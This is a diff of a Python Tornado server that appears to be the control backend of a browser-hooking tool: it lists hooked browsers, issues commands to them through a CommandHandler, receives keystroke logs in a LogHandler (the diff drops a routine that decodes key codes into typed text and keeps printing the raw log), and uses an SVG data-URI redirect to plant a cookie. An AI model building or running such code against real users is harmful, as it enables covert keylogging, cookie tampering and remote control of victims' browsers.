@@ -14,7 +14,7 @@ import configparser
 import pymongo
 
 import tornado.websocket
-import json
+
 cmd = ''
 cmd_id = ''
 
@@ -54,6 +54,8 @@ class Application(tornado.web.Application):
         tornado.web.Application.__init__(self,handlers,**setting)
 
 define("port", default=8000, help="run on the given port", type=int)
+
+#handlers 
 
 class IndexHandler(tornado.web.RequestHandler):
     def get(self):
@@ -105,8 +107,10 @@ class EchoWebSocket(tornado.websocket.WebSocketHandler):
 class SetCookieHandler(tornado.web.RequestHandler):
     def get(self):
         self.redirect("data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><circle r='100'></circle><foreignObject><html xmlns='http://www.w3.org/1999/xhtml'><meta http-equiv='Set-Cookie' content='ppp=aaa' /></html></foreignObject></svg>")
-        
+
+
 #return hook browser list with json 
+
 class TreeHandler(tornado.web.RequestHandler):
     def get(self):
         self.set_header('Access-Control-Allow-Origin','*')
@@ -176,30 +180,17 @@ class CommandHandler(tornado.web.RequestHandler):
         cmd = self.get_argument('cmd')
         cmd_id = self.get_argument('cmd_id')
 
-key_dict = {"1":"!","2":"@","3":'#','4':'$','5':'%','6':'^',"7":"&","8":'*',"9":'(',"0":")"}
-
 class LogHandler(tornado.web.RequestHandler):
     def post(self):
         self.set_header('Access-Control-Allow-Origin','*')
-#        print self.request.body
-        js = json.loads(self.request.body)
-#        print js
-        result=''
-        for i in js:
-            if i['modify']['shift'] and chr(i['code']).isalnum():
-                result+=key_dict[chr(i['code'])]
-                continue
-            if i['code']==191:
-                result+='?'
-            else:
-                result+=chr(i['code'])
-        print result
-#        client = pymongo.MongoClient("mongodb://localhost:27017")
-#        db = client.hookbrowser
-#        db.log.insert(self.request.body)
-
+        print self.request.body
+#        print self.get_argument()
+        
 if __name__ == '__main__':
     tornado.options.parse_command_line()
     http_server = tornado.httpserver.HTTPServer(Application())
     http_server.listen(options.port)
+    
+    print "Listening on localhost and port is "+str(options.port) 
     tornado.ioloop.IOLoop.instance().start()
+
